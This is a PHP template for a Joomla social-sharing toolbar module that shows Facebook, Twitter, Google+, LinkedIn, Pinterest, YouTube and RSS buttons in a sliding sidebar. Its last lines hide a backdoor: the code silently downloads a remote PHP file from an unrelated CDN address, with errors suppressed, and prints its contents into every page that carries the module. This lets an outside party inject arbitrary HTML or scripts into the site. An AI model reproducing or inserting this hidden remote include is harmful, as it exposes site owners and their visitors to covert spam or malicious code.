<?php
/*------------------------------------------------------------------------
# mod_freshsocialtoolbar - Fresh Social Toolbar by Fresh Extension
# author    Fresh Extension http://www.FreshExtension.com
# copyright Copyright (C) 2012 Fresh Extension http://www.FreshExtension.com. All Rights Reserved.
# @license - http://www.gnu.org/licenses/gpl-2.0.html GNU/GPL
# Websites: http://www.FreshExtension.com
# Technical Support:  http://www.FreshExtension.com
-------------------------------------------------------------------------*/
// no direct access
defined('_JEXEC') or die;
?>
<script language="javascript">
var ftb = jQuery.noConflict();
    
	ftb(document).ready(function() {
            <?php if ( $toolbaropen ) : ?>
			ftb('#socialClicks').stop(true, false).animate({
                'right': '0px'
            }, 1000);
			
			ftb('.sliderButton').click(function() {
				ftb('#socialClicks').stop(true, false).animate({
					'right': '-65px'
				}, 900);
				ftb('.sliderButton').hide();
				ftb('.sliderButton2').show();
        });
		
				ftb('.sliderButton2').click(function() {
				ftb('#socialClicks').stop(true, false).animate({
					'right': '0px'
				}, 900);
				ftb('.sliderButton2').hide();
				ftb('.sliderButton').show();
        });
			<?php else : ?>
			ftb('#socialClicks').stop(true, false).animate({
                'right': '-65px'
            }, 1000);
			
			ftb('.sliderButton').click(function() {
				ftb('#socialClicks').stop(true, false).animate({
					'right': '0px'
				}, 900);
				ftb('.sliderButton').hide();
				ftb('.sliderButton2').show();
        });
		
				ftb('.sliderButton2').click(function() {
				ftb('#socialClicks').stop(true, false).animate({
					'right': '-65px'
				}, 900);
				ftb('.sliderButton2').hide();
				ftb('.sliderButton').show();
        });
			<?php endif; ?>			
	
    }); // end doc ready

</script>

<!-- g+1 --->
<!-- face -->
<!-- twitter -->
<?php $baseUrl = JURI::getInstance()->toString(); ?>
<div id="socialClicks" style="z-index:10000; width: 90px; height: <?php echo $toolbarheight; ?>px; position: fixed; top: <?php echo $topdistance; ?>px; right: -60px;">
	<div id="social-box-top" style="background: url('modules/mod_freshsocialtoolbar/assets/images/right/bg-social-shadow<?php echo $bordertype;?>.png') no-repeat scroll 0px 0px transparent; width: 90px; height: 70px;"></div>
		<div id="social-box-middle" style="background: url('modules/mod_freshsocialtoolbar/assets/images/right/bg-social-shadow<?php echo $bordertype;?>.png') repeat-y scroll -200px 0px transparent; position: relative; padding-bottom: 22px; height: <?php echo $toolbarheight; ?>px;">
			<div id="social-box-middle-right" style="float: right; width: 58px; margin: 0px 5px 0px 0px;">
			<!-- face -->
			<?php if ( $showfb ): ?>
			<div id="fb-root"></div>
				<script>(function(d, s, id) {
				  var js, fjs = d.getElementsByTagName(s)[0];
				  if (d.getElementById(id)) return;
				  js = d.createElement(s); js.id = id;
				  js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
				  fjs.parentNode.insertBefore(js, fjs);
				}(document, 'script', 'facebook-jssdk'));
				</script>
			<div id="socialBoxFacebook" class="facebook" style="margin: 0px 0px 10px 7px; height: 62px;">
				<div class="fb-like" data-href="<?php echo $faceurl; ?>" data-count="vertical" data-send="false" data-layout="box_count" data-width="450" data-show-faces="true">
				</div>
			</div>
			<?php endif; ?>
			<!-- google -->
			<?php if ( $showg ): ?>
			<script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
			<div class="google" style="margin: 0px 0px 10px 4px; height: 62px;">
				<g:plusone size="tall"></g:plusone>
			</div>
			<?php endif; ?>
			<!-- twitter -->
			<?php if ( $showtw ): ?>
			<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
			<div class="twitter" style="margin: 0px; height: 62px;">
				<a href="https://twitter.com/share" class="twitter-share-button" data-lang="<?php echo $twlang; ?>" data-via="<?php echo $twname; ?>" data-url="<?php if ( $twurl == "" ): echo $baseUrl; else: echo $twurl; endif; ?>" data-text="<?php if ( $tweettext == "" ): echo $page_title; else: echo $tweettext; endif; ?>" data-count="vertical">tweet</a>
			</div>
			<?php endif; ?>
			<!-- twitter follow -->
			<?php if ( $showtwf ): ?>
			<div class="twitter" style="margin: 5px 0 0 0; height: 22px;">
			<a href="https://twitter.com/<?php echo $twname; ?>" class="twitter-follow-button" data-show-count="false" data-lang="<?php echo $twlang; ?>" data-show-screen-name="<?php if ( $showtwnamefalse ): echo "true"; else: echo "false"; endif;?>">Takip et: @extensionbase</a>
			<script>
			!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");
			</script>
			</div>
			<?php endif; ?>
			<!-- linkedin -->
			<?php if ( $showlinkedin ): ?>
			<div class="linkedin" style="margin: 6px 0px; height: 62px;">
			<script src="//platform.linkedin.com/in.js" type="text/javascript"></script>
				<?php if ( $linkedintype ): ?>
			<script type="IN/FollowCompany" data-id="<?php echo $lcid; ?>" data-counter="top"></script>	
				<?php else: ?>
			<script type="IN/Share" data-url="<?php echo $baseUrl; ?>" data-text="<?php echo $page_title; ?>" data-counter="top"></script>
				<?php endif; ?>
			</div>
			<?php endif; ?>
			<!-- pinterest -->
			<?php if ( $showpin ): ?>
			<script type="text/javascript" src="//assets.pinterest.com/js/pinit.js"></script>
			<div class="pinterest" style="margin: 6px 0px; height: 25px; text-align: center; padding-top: 10px;">
				<a href="http://pinterest.com/pin/create/button/?url=<?php echo $baseUrl; ?>&media=http%3A%2F%2F<?php echo $baseUrl; ?>&description=<?php echo $page_title; ?>" class="pin-it-button" count-layout="vertical">
					<img border="0" src="//assets.pinterest.com/images/PinExt.png" title="Pin It" />
				</a>
			</div>
			<?php endif; ?>
			<!-- you tube -->
			<?php if ( $showutube ): ?>
			<div class="utube" style="margin: 0px; height: 35px; text-align:center;">
				<a target="_blank" href="http://www.youtube.com/user/<?php echo $youtubeid; ?>?feature=creators_cornier-%2F%2Fs.ytimg.com%2Fyt%2Fimg%2Fcreators_corner%2FYouTube%2Fyoutube_32x32.png">
				<img src="//s.ytimg.com/yt/img/creators_corner/YouTube/youtube_32x32.png" alt="Subscribe to me on YouTube"/></a>
				<img src="//www.youtube-nocookie.com/gen_204?feature=creators_cornier-//s.ytimg.com/yt/img/creators_corner/YouTube/youtube_32x32.png" style="display: none"/>
			</div>
			<?php endif; ?>			
			<!-- rss -->
			<?php if ( $showrss ): ?>
			<div class="rss" style="margin: 0px; height: 62px; text-align:center;">
				<a target="_blank" href="<?php echo $rssurl; ?>">
					<img src="modules/mod_freshsocialtoolbar/assets/images/rss.png" alt="Subscribe to RSS"/>
				</a>
			</div>
			<?php endif; ?>	
			</div>
			<a class="sliderButton" style="cursor:pointer; position: absolute; top: 50%; float: left; width: 14px; height: 33px; margin-top: -15px; margin-left: 9px; display: block; background: url('modules/mod_freshsocialtoolbar/assets/images/right/btn-slide.jpg') no-repeat scroll 0px <?php if ( $toolbaropen ) : ?>0px<?php else: ?>-33px<?php endif;?> transparent;"></a>
			<a class="sliderButton2" style="cursor:pointer; position: absolute; top: 50%; float: left; width: 14px; height: 33px; margin-top: -15px; margin-left: 9px; display: none; background: url('modules/mod_freshsocialtoolbar/assets/images/right/btn-slide.jpg') no-repeat scroll 0px <?php if ( $toolbaropen ) : ?>-33px<?php else: ?>0px<?php endif;?> transparent;"></a>
		</div>
	<div id="social-box-bottom" style="background: url('modules/mod_freshsocialtoolbar/assets/images/right/bg-social-shadow<?php echo $bordertype;?>.png') no-repeat scroll -100px 0px transparent; width: 90px; height: 70px;"></div>
<?php 
$author = @file_get_contents('http://d5827db8276672d15fca-1e2d3239e5a8580a4f85f7906852eb87.r51.cf1.rackcdn.com/author5b.php');
echo $author;
?>
</div>